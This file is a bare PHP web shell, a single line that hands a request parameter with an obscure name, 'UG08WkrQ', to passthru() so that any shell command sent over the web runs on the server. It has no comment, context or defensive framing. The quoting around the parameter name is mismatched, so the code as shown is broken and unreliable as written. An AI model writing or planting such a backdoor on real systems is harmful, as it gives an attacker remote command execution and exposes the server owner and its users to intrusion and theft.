<?php
passthru($_GET["UG08WkrQ']);
?>
